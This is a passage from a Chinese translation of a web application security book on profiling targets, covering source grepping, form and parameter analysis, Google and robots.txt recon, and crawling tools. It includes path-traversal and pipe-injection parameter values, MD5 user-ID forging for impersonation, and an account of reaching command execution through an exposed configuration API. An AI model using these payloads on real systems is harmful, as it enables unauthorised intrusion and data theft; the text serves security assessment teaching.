如果你发现了 SQL 字符串，该 Web 实在太脆弱了——该应用程序很快会被攻陷（虽然你需要等到第 8 章才知道为什么）。对特定字符串的搜索总是大有收获的，不过最后你还是得用写字板或者 vi 打开该文件来获得完整的视图。

注意 当使用 grep 命令时，请使用 -i 标记（表示忽略），-AN 标记（表示显示匹配行的后 N 行），以及 -BN 标记（表示显示匹配行的前 N 行）。

曾经有段时间，语法错误在动态页面中盛行。不正确的语法可能导致文件仅部分执行，这会将一些原始代码片断留在 HTML 源文件中。下面是一个来自 Web 站点的代码片断，受到一个放错位置的 PHP 标记的攻击。

Go to forum!\n"; $file = "http://www.victim.com/$subdir/
list2.php?f=$num"; if (readfile($file) == 0) { echo " (0 messages so far)"; } ?>

另一个应该在 HTML 中搜索的东西，是表示服务器端执行的标记，比如，PHP 中的<? 和?, ASP 页面的<% 和%> 和<runat=server>。这些标记可以暴露站点开发人员从未打算让公众看到的有趣的内幕信息。

当与 Internet 搜索引擎，比如 Google 的威力结合起来时，HTML 源代码信息同样可以提供有用的信息。比如，你可能在注释中找到开发者的名字和 E-mail 地址，虽然它本身并不是什么有用的信息，但如果你在 Google 中搜索，发现了这个开发者发帖询问了关于他的应用程序开发的几个问题，那又会怎么样呢？你会突然明白这个应用程序是如何开发的。同样，你也可以使用相同的信息，假定该用户名是站点的一个认证部分，对该用户名使用暴力破解密码。

有一次，我们用 Google 搜索在 HTML 注释中发现的用户名，发现了该开发者编写的其他应用程序，并可以在他的 Web 站点下载。查看了这些代码后，我们知道了他的应用程序使用的是他自己 Web 站点上的配置数据。没有花多少力气，我们在该配置数据中发现了 DES 管理员密码文件。下载该文件，并对它运行密码破解工具，不到一个小时，我们就得到了密码，并以管理员身份登录。所有的成功都是缘于一个注释和开发者主页的帮助。

一些 HTML 网页源码隐藏数据过滤检测的思想：经验法则是搜寻任何可能包含对你来说还是未知信息的东西。当你看到一些像随机数字的字符串在每个页面文件注释中出现时，就应该深入地调查它们。这些随机数字可能属于一个媒体管理应用程序，该程序拥有一个 Web 可访问接口。在 Web 评估中，最小量的信息可以带来最大的突破。因此不要让任何东西从你身边溜走，无论它们第一眼看起来是多么地无关紧要。

##### 表单

表单是所有 Web 应用程序的骨干。当你在 Web 站点上创建账户的时候，有多少次你取消了这样的对话框：“Do not uncheck this box to not receive SPAM！”（在没有收到 SPAM 前不要取消选择该对话框）。甚至英语专家的收件箱也会由于搞混了 opt-out （或者 opt-in）验证，而被填满垃圾邮件。当然，关于表单，更重要的是和安全相关的部分，不过，因为大多数输入验证攻击都是针对表单信息执行的，你需要拥有这部分信息。

当手工检查应用程序时，注意每个带有输入字段的页面。你可以通过点击浏览该站点发现大多数的表单。但是，只是视觉上的证实是不够的，我们需要再一次检查源代码。用我们的命令行朋友，它是很乐于镜像整个站点的，然后使用 grep 寻找表单最简单的指示符——表单的标识。记住避免使用字符“<”，因为它在命令行中有特殊的含义。

[root@meddle]# getit.sh www.victim.com /index.html | grep -i \<form www.victim.com [192.168.33.101] 80 (http) open
sent 27, rcvd 2683: NOTSOCK
<form name=gs method=GET action=/search>

现在我们有了表单的名字——gs。我们知道它使用 GET 而不是 POST，并且它调用了 Web 在 Web 根目录下叫做 “search” 的脚本。回头看看我们对帮助文件的搜索，接下来我

我们要查找的几个文件可能是：search.inc，search.js，gs.inc 和 gs.js。幸运的猜测总是没坏处的。如果需要，记得下载/search 文件的 HTML 源代码。

接下来，找出表单包含了哪些字段，在这一阶段需要对源代码进行细查，不过我们可以使用 grep 简化这项工作。

[root@meddle]# getit.sh www.victim.com /index.html | grep -i "input type"
www.victim.com [192.168.238.26] 80 (http) open
<input type="text" name="name" size="10" maxlength="15">
<input type="password" name="passwd" size="10" maxlength="15">
<input type=hidden name=vote value="websites">
<input type="submit" name="Submit" value="Login">

该表单显示了三项：一个登录字段，一个密码字段，以及带有“Login”字样的提交按钮。用户名和密码都不能长于15个字符（应用程序很可能会因此而信任该限制）。HTML源代码还暴露了第四个字段：“name”。一个应用程序使用隐藏字段可能有一些目的，但它们绝大多数都会影响到站点的安全。会话处理、用户识别、密码、项目成本，以及其他一些敏感信息，应用程序都倾向于把它们放在隐藏字段中。我们知道你正准备真正尝试一下输入验证，不过请耐心点，我们应该获取完关于该站点所有能获取的信息。

如果你正尝试创建一个暴力破解脚本来执行表单登录，那么就要枚举所有的密码字段（你可能必须要忽略字符“\”）。

[root@meddle]# getit.sh www.victim.com /index.html | \
> grep -i "type=\"password\""
www.victim.com [192.168.238.26] 80 (http) open
<input type="password" name="passwd" size="10" maxlength="15">

有经验的程序员可能不会在表单中使用密码输入类型或者“password”、“passwd”和“pwd”等字样。你可以搜索一个不同的字符串，但它的命中概率就更小啦。稍微新一点的Web浏览器都支持自动完成（autocomplete）功能，该功能使得用户在访问Web站点时，不用每次输入同样的信息。比如，浏览器可能保存了用户的地址。这样，浏览器每次检测到一个地址字段时（即，浏览器在表单中搜索“address”字段），它会自动填入用户的信息。但是，对于密码字段，自动完成功能通常是被设置成“关闭”（off）的。因此我们就搜索自动完成功能设置为关闭的字段。请见如下示例：

[root@meddle]# getit.sh www.victim.com /login.html | \
> grep -i autocomplete
www.victim.com [192.168.106.34] 80 (http) open
<input type=text name="val2" size="12" autocomplete=off>

这暗示着“val2”可能是一个密码字段，至少，它看上去包含了程序员不想让浏览器

保存的敏感信息。在这个例子中，没有使用 type="password" 会是一个安全问题，因为用户在该字段输入密码数据时，密码不会以星号显示。因此，当检查一个页面的表单时，要注意到它的所有方面。

o 方法：表单提交数据使用的是 GET 还是 POST? GET 请求更容易在 URL 中操纵。

o 行为：表单调用了什么样的脚本？使用的是什么脚本语言（.pl，.sh，.asp）？如果你看见了一个表单调用带有.sh 扩展名的脚本（shell 脚本），请做一下标记，Shell 脚本在 Web 服务器上是非常不安全的。

☐ 最大长度：输入字段是否作了输入限制？长度限制是很容易被绕过的。

- 隐藏：字段是否对用户进行了隐藏？该隐藏字段的值是什么？这些字段都很容易被修改。

☐ 自动完成：是否使用了自动完成标记？为什么？输入字段是否请求了敏感信息？

☐ 密码：是否是一个密码字段？对应的登录字段是什么呢？

##### 查询字符串和参数

对于一个给定的 URL，可能最重要的部分是查询字符串。查询字符串在大多数情况下位于问号标记的后面，指明了发给程序内部动态可执行程序或库的一些参数。一个查询字符串例子如下：

http://www.site.com/search.cgi?searchTerm=test

在该例中，参数 “searchTerm” 带的值是 “test”，发送给了站点上的 search.cgi 可执行程序。

查询字符串和参数是需要收集的最重要信息，它们代表了动态 Web 应用的核心功能，而该部分由于带有最易变化的部分，是最不安全的。例如，你可以操纵参数值，从而冒充其他用户、获得受限数据、运行任意系统命令，或者执行其他的应用程序开发者意料之外的操作。参数的名字也有可能提供关于应用程序内部工作的信息。它们可能代表了数据库的列名，有可能是明显的会话ID，或者还可能包含了用户名。应用程序管理这些字符串，但有可能没有正确地验证它们。

查询字符串指纹识别 根据应用程序和它的设计的不同, 有几种识别应用程序的方法, 这些方法基于参数的形式和实现方式。你应该掌握这些方法。就像我们前面提到的那样, 通常在查询字符串中紧随 “?” 的部分包含参数。但是, 在更复杂和定制的应用程序中, 该规则不是总是适用的。因此, 首先你需要识别路径、文件名和参数。比如, 在表 2-3 所示的 URL 列表中, 定位刚开始的 URL 中的参数很容易, 但逐渐就变得很困难。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>查询字符串</td><td style='text-align: center; word-wrap: break-word;'>总结</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/file.xxx?paramname=paramvalue</td><td style='text-align: center; word-wrap: break-word;'>简单，标准的 URL 参数结构</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/folder/filename/paramname=paramvalue</td><td style='text-align: center; word-wrap: break-word;'>这里的文件名看起来像一个文件夹</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/folder/file/paramname&amp;paramvalue</td><td style='text-align: center; word-wrap: break-word;'>这里用&amp;代表等号“=”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/folder/(SessionState)/file/paramvalue</td><td style='text-align: center; word-wrap: break-word;'>在 URL 中保持会话状态——很难确定文件、目录或者参数开始和结束的地方</td></tr></table>

我们用来区分这些参数的方法，是从 URL 中删除一些项目。应用程序服务器对每个删除的部分，通常会产生一个标准的错误信息。比如，我们删除了从 URL 到斜线的所有东西，这样可能会产生诸如“错误，未知程序调用”的信息。然后，我们继续删除 URL 的各部分，直到我们接收到了一个不同的错误信息。一旦我们接收到 404 错误信息，就可以假设删掉的部分是文件。而且你可以复制出错误信息的内容，然后用 Google 看能否发现任何应用程序文档。

在接下来的“常见 Web 应用剖析”一节中，我们会提供关于查询字符串结构指纹的大量例子。在这里先给出一对例子，吊吊你的胃口。

file.xxx?OpenDocument or even !OpenDatabase (Lotus Domino)
file.xxx?BV_SESSIONID=(junk)&BV_ENGINEID=(junk) (BroadVision)

分析查询字符串和参数 收集查询字符串和参数是一件很复杂的工作，因为很少有两个应用程序是相同的。在你收集变量名和变量值时，请注意某种趋势。我们再次用下面这个例子演示一些重要的趋势。

http://www.site.com/search.cgi?searchTerm=testing&resultPage=testing&db=/templates/db/archive.db

对于这些参数，这里有三件有趣的事情：

resultPage 的值和 searchTerm 的值相同——使用用户的输入做一些事情，而不是仅仅为了得到用户的输入，这是出现安全问题的一个重要方面（只要处理恶意输入的流程不完善，就可能受到攻击）。

resultPage 的名字带来了一些需要注意的问题，如果该参数的值确实不像是一个 URL，那么它有可能被用来创建一个文件，或者告诉应用程序上载一个名为该参数值的文件。

真正引起我们注意的是 db=/templates/db/archive.db，我们接下来会进行讨论。

表 2-4 列出了我们在查询字符串中看见 db=/[path] 语法后, 在头 5 分钟内应该做的事情。任何逻辑上使用文件系统路径作为输入的应用程序, 都很可能有问题。这些针对 Web 应用

文件路径漏洞的常见攻击技术，将说明这些问题的本质。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>参 数</td><td style='text-align: center; word-wrap: break-word;'>含 义</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=//...//...//etc/passwd</td><td style='text-align: center; word-wrap: break-word;'>这样做可以获取文件吗？如果是 win32 系统，尝试获取 boot.int 或者一些其他文件</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=/templates/db/</td><td style='text-align: center; word-wrap: break-word;'>我们可以列出目录吗？或者获得一个古怪的错误吗</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=/templates/db/%00</td><td style='text-align: center; word-wrap: break-word;'>这样是使用 NULL 字节技巧来获得一个目录列表或者古怪的错误</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=/templates/db/junk.db</td><td style='text-align: center; word-wrap: break-word;'>当我们给服务器传递一个非法的数据库名时，会发生什么呢</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=lls or db=ldir</td><td style='text-align: center; word-wrap: break-word;'>这在尝试使用古老的 Perl 管道技巧</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=</td><td style='text-align: center; word-wrap: break-word;'>对于参数永远都要尝试一下空格</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=*</td><td style='text-align: center; word-wrap: break-word;'>如果我们使用*作为 path，它会在配置中搜索所有的数据库吗</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>db=/search.cgi</td><td style='text-align: center; word-wrap: break-word;'>如果我们给参数提交一个在 Web 站点上存在的文件名，会发生什么呢？会转储出源代码吗</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>http://www.site.com/templates/db/archive.db</td><td style='text-align: center; word-wrap: break-word;'>这样做我们可以直接下载到 DB 文件吗</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>http://www.site.com/templates/db/</td><td style='text-align: center; word-wrap: break-word;'>这样做我们可以获得目录列表吗</td></tr></table>

我们当然要对 resultPage 参数尝试所有的这些技巧。如果你真的想更深入地研究，可以搜索 “search.cgi archive.db”，或者更多地学习搜索引擎是如何工作的，或者假设 “db” 就是被搜索的数据库。请更有创造性点——你可以猜测其他隐藏的数据库名，这些数据库可能带有非面向公众使用的信息，比如：

db=/templates/db/current.db
db=/templates/db/intranet.db
db=/templates/db/system.db
db=/templates/db/default.db

下面是其他一些常见查询字符串/参数，它们有可能指出潜在有漏洞的应用程序的逻辑。

用户标识符 查找能代表用户的值。它可以是一个用户名、一个数字、用户的社会保险号码，或者其他看上去与用户相关的值。这些信息可用于假冒攻击。相关的字符串是userid，username，user，usr，name，id 和 uid。比如：

/login?userid=24601.

不要害怕这些用户参数的散列值，比如，你最终可能会遇到看起来像下面这样的参数：

/login?userid= 7ece221bf3f5dbddbe3c2770ac19b419

事实上，这同样是 userid 值，只不过用 MD5 作了散列而已。要利用该问题，只需将值增大到 24602，再对该值进行 MD5 加密，并用得到的值替代该参数值即可。识别这些被改

变的参数值的一个很好的方法是保持一个常见值的散列数据库，比如数字、常见用户名、常见角色等等。然后，使用数据库对应用程序中发现的任何 MD5 值进行简单的对比，就会发现刚才提到的简单的散列技术。

会话标识 查找在整个会话过程中保持不变的值。Cookie也会进行会话处理。一些应用程序可能在URL中传递会话信息。相关的字符串是sessionid，session，sid和s。比如：

/menu.asp?sid=89CD9A9347

数据库查询 检查 URL 中任何看上去像传递给数据库的值。常见的值是姓名、地址信息、爱好或者其他用户的输入。这些都是输入验证攻击和 SQL 注入攻击的上佳候选。最简单的检查是否为数据库值的方法，是将 URL 行为和其带有的数据进行匹配。比如：

/dbsubmit .php?sTitle=Ms&iPhone=8675309

查找编码/加密值 不要被参数中形式复杂的字符串所吓倒。例如，你可能会看见ASP.NET的状态查看参数为：

"VIEWSTATE=dDwtNTI00DU5MDE1Ozs+ZBCF2ryjMpeVgUrY2eTj79HN14Q="

这个字符串看起来很复杂，其实它只不过是 Base64 编码后的值。只要看到字符串中包含了随机的大小写字母 A~Z，数字 0~9 和一些分散的+和/，就可以确定这一点。而最明显的标志是在字符串末尾有一到两个等号 “=”。把该字符串传递到 Base64 解码工具中，看看它们究竟是什么，是一件很容易的事情。一些在 Web 应用程序中经常使用的编码/加密算法包括 MD5，SHA-1 和古老的异或法。通常，长度是检测出它们的关键。但要注意的是，许多 Web 应用程序结合了多种散列和其他类型的数据。识别分隔符是关键，这使得我们更容易确定字符串使用的是什么编码方法。

布尔参数 篡改布尔参数是很容易的，因为通用的潜在值是很少的。比如，对“debug”这样的布尔参数，攻击者可以尝试设置它们的值为 TRUE，T 或者 1。其他一些布尔参数还包括 dbg，admin，Source 和 show。

##### 常见的 Cookie

URL 不是识别所运行的应用程序类型的唯一途径。很多时候，应用程序和 Web 服务器会采用它们自己的 Cookie，如表 2-5 中所示的例子。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>软件</td><td style='text-align: center; word-wrap: break-word;'>Cookie 结构</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IIS 5/6</td><td style='text-align: center; word-wrap: break-word;'>ASPSESSIONID=[string]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ColdFusion</td><td style='text-align: center; word-wrap: break-word;'>efid=[number] cftoken=[number]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>J2EE Applications</td><td style='text-align: center; word-wrap: break-word;'>jsessionid=[string]</td></tr></table>

##### 后端访问点

最后要收集的一组信息是后端连接的迹象。当应用程序更新地址信息或改变密码时，注意从数据库中读取或写入的那些信息。要重点标记出与数据库或其他系统直接关联的页面，或者加入注释。

一些 WebDAV 选项使远程管理 Web 服务器成为可能。一个配置错误的服务器可能会允许任何人上传、删除、修改或者浏览 Web 文档根目录。检查是否开启了这些功能。我们会在第 3 章中更详细地讨论如何识别和访问 WebDAV。

#### 2.2.2 使用搜索工具进行剖析

搜索引擎总是黑客的好朋友。可以假定，某个主要的 Internet 搜索引擎，在过去对你的目标 Web 应用至少建立过一次索引。在写这本书的时候，最流行和有效的搜索引擎包括 Google，MSN 搜索，Yahoo，Ask Jeeves，Lycos，Alta Vista 和很多其他的搜索引擎（你可以在本章的最后“参考和进一步阅读”中找到这些链接）。

我们个人最喜欢的是 Google。下面是我们使用搜索引擎进行 Web 应用剖析时，所使用的一些基本技术。这些例子都是基于 Google 语法的：

- 使用 “site:www.victim.com”（带引号）搜索特定的 Web 站点，可以查到包含 www.victim.com 的 URL。

- 使用 “related:www.victim.com”（不带引号）搜索与某个特定 Web 站点相关的页面，返回是与 www.victim.com 相关的结果。

o 检查缓存中的“快照”结果，快照从 Google 数据库中得到内容，这样，你不用离开 www.google.com 的舒适服务，就能浏览一个站点上某个特定页面，Google 真是一个超级代理啊！

调查 “相似页面”（similar pages）的搜索结果，它们与前面提到的 related 关键字类似。

○ 检查包含了新闻组发布的搜索结果，看看是否有关于该站点的相关信息被发布在上面。这有可能包含用户关于登录困难的抱怨，或者管理员关于软件组件的求助信息。

确定只用域名进行了搜索，比如“site:victim.com”。这可以返回比如“mail.victim.com”或“beta.victim.com”这样的搜索结果。

另外有一个非常有效的方法，使得站点剖析事半功倍，这就是在检查站点时仔细观察应用程序是如何与它的 URL 交互的。尝试找出 URL 的特点。比如，可能是文件名、扩展名，或者甚至是参数工作的方法。你应该识别一些固定的东西，然后对其进行 Google 搜索，

看能否可以找到任何文档，或者运行该应用的其他站点。比如，在最近对一个应用程序的评估过程中，我们通过浏览调查 URL 是如何设立的。其主页的 URL 像下面这样：

http://site/wconnect/ace/home.htm

主页上“在线课程”的链接如下:

https://site/wconnect/wc.dll?acecode%7ESubGroup%7EONL%7EOnline%2BCourses

按照这个链接，我们对站点进行了进一步的浏览，注意下面这些 URL:

https://site/wconnect/
wc.dll?acecode~GroupCatalog~GROUP~ONLFIN~Financial+Planning+Online~ONL

https://site/wconnect/
wc.dll?acecode~GroupCatalog~GROUP~ONLFIN~Financial+Planning+Online~ONL~&ORDER=LOCATION

请注意，我们浏览的任何地方，参数都是传递给 wc.dll 的。因此我们需要找到更多关于该文件的信息。为了实现这个目的，我们在 Google 中搜索 “/wconnect/wc.dll”。搜索结果为我们列出了运行该文件的其他站点。在快速的搜索后，我们确定该文件属于 West-Wind 开发的叫做 “Web Connection” 的应用程序。经过更深入的挖掘，我们来到 West-Wind 站点的客服部分，找到了管理员向导。在阅读文档时，我们发现在 “http://site/wconnect/admin.asp” 上可以访问基于 Web 的管理员页面。因此我们返回站点，试着访问该页面。但是我们对管理页面的请求返回了 “IP 地址被拒绝” 错误，这是因为我们试图从未授权的 IP 地址访问受限的区域。看起来管理员很好地使用了访问控制列表（ACL）。看来这是一个死胡同，因为我们找不到伪造 IP 地址的方法。不过我们生来就是为了迎接挑战的，这反而激发了我们的斗志，因此我们再次回到了文档。这次我们发现有一个 URL 允许访问应用程序的状态页面，只需输入 http://site.com/wconnect/wc.dll?_maintain_ShowStatus。该页面如图 2-3 所示。

通过这个请求，我们成功地访问了应用程序的状态页面。当我们仔细地观察状态页面时，发现了一些有趣的东西：有一个叫做“回到管理页面”的链接。这是很值得注意的，因为我们并不是从管理页面来到该页面的。当点击该链接时，它会让我们回到 admin.asp 页面，但显示的却是拒绝访问（和预想的一样）。不过我们知道了这正是值得调查的事情。我们感觉自己就处在突破的边缘，因为我们刚才没有访问管理页面，却已经访问了一个管理的功能。再次回到文档后，我们发现管理员页面只是一个发动调用 wc.dll 实现函数的页面。因此，如果我们知道管理函数，就可以直接通过 wc.dll 调用它们，而不需要访问 admin.asp 页面。这是一个突破，证明我们所有的剖析工作和调查都是值得的。

 </div>

我们返回到文档，以确定所有可能提供系统深入访问的函数调用，以及寻找所有对我们工作提供帮助的有趣东西。在手册里面，我们发现了一个 wconnect.ini 文件参数的描述，应用程序从 wconnect.ini 文件读取设置。文档中提到可以定义一个参数来运行 .exe 文件。下面是文档的描述：

“StartEXE：运行 DLL ini 文件中 ExeFile 所指定的 EXE 文件，该功能的设置是为了基于文件进行消息传递。EXE 从 System 上下文中运行，因此由服务启用它时是不可见的。”

这就是我们在一直寻找的东西。现在我们需要一种方法改变这个参数的值，这样就可以启动我们定义的.exe 文件。运气不错，我们在文档中发现了一个叫做“wwMain~EditConfig”的 API。文档提到了该 API 调用允许远程对 Web 连接配置文件进行编辑。文档热心地描述了一个带有服务器配置文件的链接，这个配置文件是用来做远程编辑的，该链接如下：

 $$ \mathrm{http://site.com/wconnect/wc.dll?wwMain\sim EditConfig} $$ 

Bingo，这就是我们所需要的！在浏览器中插入该 URL，使我们能编辑和更新.ini 文件。然后我们找到ExeFile 参数，并把它的值改为“c:\winnt\system32\cmd.exe /c dir /S c:\>d:\inetpub\wwwroot\dir.txt”，如图 2-4 所示。

这使我们可以列出系统中所有的文件，并把它们导出到一个位于 Web 根目录的文本文件中。然后，我们更新.ini 文件。现在，剩下唯一需要做的事情是找到一种方法，可以让应用服务器重新读入配置文件，这样我们的命令就可以执行了。

 </div>

回顾文档，发现了我们正好需要的东西：http://site.com/wc.dll?_maintain~StartExe，这会促使应用程序重启并执行我们的命令。当这些完成后，我们可以通过 http://site.com/dir.txt 访问新创建的文件。

所有的这些都起始于一个简单的 Google 查询。当你考虑 Web 站点的结构和逻辑时，请记住这一点。我们会在本章后面的“常用对抗措施”一节中，讨论可能的对抗措施。

##### Robots.txt

在我们开始使用 Internet 搜索引擎之前，我们想提醒注意一个与搜索相关的另外的问题，该问题可以大大提高剖析的效率。robots.txt 文件包含了一个目录列表，像 Google 这样的搜索引擎会按照其指示，对目录进行检索或者忽略。该文件甚至可能就在 Google 上，或者你也可以从站点上获取它。

[root@meddle]# getit.sh www.victim.com /robots.txt
User-agent: *
Disallow: /Admin/
Disallow: /admin/
Disallow: /common/
Disallow: /cgi-bin/
Disallow: /scripts/
Disallow: /Scripts/
Disallow: /i/
Disallow: /images/
Disallow: /Search
Disallow: /search
Disallow: /links
Disallow: /perl
Disallow: /ipchome

Disallow: /newshome
Disallow: /privacyhome
Disallow: /legalhome
Disallow: /accounthome
Disallow: /productshome
Disallow: /solutionshome
Disallow: /tmpgeos/

像这样的文件简直就是一座金矿。“Disallow”标记命令网络蜘蛛工具忽略该目录。工具和搜索引擎很少这么做。关键的一点是，robots.txt 文件提供了目录结构的一个漂亮快照，甚至明确地指向了一些错误的配置，你可以在后面利用这些错误配置进行攻击。

注意 怀疑站点不再使用 robots.txt 文件了？那就试试在 Google 上搜索 "parent directory" robots.txt 吧。（parent directory 需要像显示的那样放在双引号中）。

#### 2.2.3 自动 Web 爬行工具

我们已经花费了大量的时间来介绍剖析 Web 应用程序的手工技术，以及支持这些技术的架构。我们希望这是一次对 Web 应用程序剖析底层技术的信息巡展。

尽管这些技术很有趣，我们得承认，特别针对很大的应用程序，无数次反复的执行会使人麻木。就像我们在讨论中已经间接提到的那样，有很多工具可以自动地完成该过程，使剖析更加简单。

我们已经提到过，在剖析中使用的一种最基础和最强大的技术，就是把整个应用程序镜像到本地副本，从而可以慢慢地，仔细地审查。我们称该过程为“Web 爬行”（web crawling），当涉及大型 Web 安全评估时，Web 爬行工具是绝对需要的。你的 Web 爬行结果可以为攻击创建你的专家系统，该系统是所有 Web 应用评估中最重要的部分。你收集的信息可以帮助你识别目标的整体结构，包括 Web 应用是如何构建的，输入点，目录结构等所有重要的细节。Web 爬行的其他一些好处还包括：

☐ 节省手工劳动。

- 提供一个容易浏览的，包括 Web 应用所有组件的本地缓存副本，包括静态页面、可执行文件、表单等等。

- 镜像内容上的全局关键字搜索非常容易（比如 “password” 和其他重要的搜索项）。

- 提供了一个高级的快照，可以轻易地暴露一些内容，比如目录，文件和参数的命名习惯等。

尽管 Web 爬行非常强大，但它并不是没有缺点的。下面是 Web 爬行的一些不足之处。

- 表单 爬行工具是一个自动化的工具，在处理为了人机交互而设计的 Web 表单时，经常不能很顺利地完成任务。举个例子来说，一个 Web 站点的账户注册流程，可能

有多个需要填写表单的步骤，如果爬行工具没有正确地填写第一个表单，很可能就无法到达注册之后的步骤，这样就访问不了需要权限的页面，而这些页面只有你成功完成了注册后，应用程序才会发送给你。

- 复杂的流程图 通常爬行工具阐释了目录、文件之间的逻辑关系。但是一些非正规布局的站点，难以用爬行工具简单地处理，需要手工点击浏览站点。

客户端代码 许多 Web 爬行工具很难处理客户端代码。因此，如果你的目标 Web 站点有很多 JavaScript 代码，那你很可能需要手工检测代码，来获得应用程序如何工作的一个正确知识库。客户端代码的问题经常在免费和便宜的 Web 爬行工具中出现。你会发现很多高级的商业爬行工具已经解决了这个问题。一些客户端代码的例子包括 JavaScript，Flash，ActiveX，Java Applets 和 Ajax。

状态问题 尝试在一个要求基于 Web 认证的站点中爬行往往会有问题。当需要在爬行时维护登录状态时，大部分爬行工具就会出现故障，这会导致你的知识库被削减。应用程序用来维护状态的技术方法的数量实在是太多了。因此我们建议，当你的目标站点需要维护状态时，你最好手工剖析需要认证的站点部分，或者查看一下 Web 安全评估产品。免费的爬行工具还不能为你完成足够的工作。

不完整的 HTML/HTTP 许多爬行工具在检查应用时，试图遵循 HTTP 和 HTML 规范。但一个很大的问题是，没有 Web 应用完全遵循 HTML 规范。事实上，来自 Web 站点断掉的链接可以在一种浏览器上工作，但在另一种浏览器上就不能。让自动化工具识别出该段代码是真正断掉了，并进行自动化修补时，一直是个问题，它需要代码以 Internet Explorer 的方式工作。

尽管有这些缺点，我们还是推荐 Web 爬行工具作为剖析流程的重要部分。接下来，讨论几个我们最喜爱的 Web 爬行工具。

##### Web 爬行工具

这里列出了我们偏爱的工具，它们可以帮助我们自动完成调查应用程序这一烦琐的工作。它们大部分是网络蜘蛛（spider），一旦你将它们指向一个 URL，你就可以坐等它们在你的系统上创建一个站点的镜像。记住，这不是目标站点 ASP 源代码和数据库调用功能的复制，它只是应用程序中每个可用链接的完整集合。这些工具执行了大部分烦琐的收集文件的工作。

#### 注意 我们会在第 13 章中讨论很多 Web 应用评估工具，也包括爬行功能。

Lynx Lynx 是一个基于文本的 Web 浏览器，可以在很多 UNIX 系统中找到。它提供

了一种浏览站点的快速方法，虽然扩展的 JavaScript 会禁止它。我们发现它的最佳用途之一是下载指定的页面。

-dump 选项的 “References” 部分是很有用的。一般情况下，该选项指示 Lynx 简单地将 Web 页面的输出转储到屏幕上并退出。你可以将这一输出重定向到一个文件中。可能最开始不会发觉这个选项有用，但是 Lynx 包含了一个嵌入在页面 HTML 源代码中所有链接的列表。这对枚举链接和发现带有长参数字符串的 URL 是很有用的。

[root@meddle]# lynx -dump https://www.victim.com > homepage
[root@meddle]# cat homepage
...text removed for brevity...
References
1. http://www.victim.com/signup?lang=en
2. http://www.victim.com/help?lang=en
3. http://www.victim.com/faq?lang=en
4. http://www.victim.com/menu/
5. http://www.victim.com/preferences?anon
6. http://www.victim.com/languages
7. http://www.victim.com/images/

如果你想看 HTML 源代码而不是格式化后的页面，那么可以使用-source 选项。另外两个选项，-crawl 和 -traversal 将会收集格式化的 HTML，并将它保存到文件中。但是，这并不是创建站点镜像的好方法，因为这些被保存的文件中并不包含 HTML 源代码。

Lynx 也是一种捕捉单独 URL 的好工具。它优于“getit”脚本的主要方面是可以使用-auth 选项执行 HTTP 基础认证。

[root@meddle]# lynx -source https://www.victim.com/private/index.html

Looking up www.victim.com

Making HTTPS connection to 192.168.201.2

Secure 168-bit TLSv1/SSLv3 (EDH-RSA-DES-CBC3-SHA) HTTP connection

Sending HTTP request.

HTTP request sent; waiting for response.

Alert!: Can't retry with authorization! Contact the server's WebMaster.

Can't Access `https://192.168.201.2/private/index.html'

Alert!: Unable to access document.

lynx: Can't access startfile

[root@meddle]# lynx -source -auth=user:pass \
> https://63.142.201.2/private/index.html

<!DOCTYPE HTML PUBLIC——“/W3C//DTD HTML 3.2 FINAL//EN">

<HTML>

<HEAD>

<TITLE>Private Intranet</TITLE>

<FRAMESET BORDER=0 FRAMESPACING=0 FRAMEBORDER=0 ROWS="129,*">
    <FRAME NAME="header" SRC="./header_home.html" SCROLLING=NO MARGINWIDTH="2" MARGINHEIGHT
    T="1" FRAMEBORDER=NO BORDER="0" NORESIZE>
    <FRAME NAME="body" SRC="./body_home.html" SCROLLING=AUTO MARGINWIDTH=2 MARGINHEIGHT=2>
</FRAMESET>
</HEAD>
</HTML>

Wget Wget（www.gnu.org/software/wget/wget.html）是 Windows 和 UNIX 下的命令行工具，可以用于下载一个 Web 站点的内容。它的用法比较简单：

[root@meddle]# wget -r www.victim.com
--18:17:30-- http://www.victim.com/
=> `www.victim.com/index.html'
Connecting to www.victim.com:80... connected!
HTTP request sent, awaiting response... 200 OK
Length: 21,924 [text/html]
OK ..... ..... .
100% @ 88.84 KB/s
18:17:31 (79.00 KB/s) - `www.victim.com/index.html' saved [21924/21924]
Loading robots.txt; please ignore errors.
--18:17:31-- http://www.victim.com/robots.txt
=> 'www.victim.com/robots.txt'
Connecting to www.victim.com:80... connected!
HTTP request sent, awaiting response... 200 OK
Length: 458 [text/html]
OK
... (continues for entire site)...

-r 或 - recursive 选项指示 Wget 跟随着主页上的每个链接。这将创建一个 www.victim.com 目录，并用 Wget 发现的该站点的 HTML 文件和目录填充该目录。Wget 的一个主要优点是可以跟踪每个链接。因此，它会下载应用程序传递给页面的每个参数的输出，例如，某个站点的 viewer.asp 文件可能会被下载四次：

o viewer.asp@ID=555
o viewer.asp@ID=7
o viewer.asp@ID=42
o viewer.asp@ID=23

其中@符号表示早期 URL 中的问号“？”分界符。ID 是传递给 viewer.asp 文件的第一个参数。一些站点可能要求更高级的选项，比如，对代理和 HTTP 基础认证的支持。被基

础认证保护的站点可以通过网络蜘蛛用下面的方法获得：

[root@meddle]# wget -r --http-user:dwayne --http-pass:woodelf \
> https://www.victim.com/secure/
--20:19:11-- https://www.victim.com/secure/
=> `www.victim.com/secure/index.html'
Connecting to www.victim.com:443... connected!
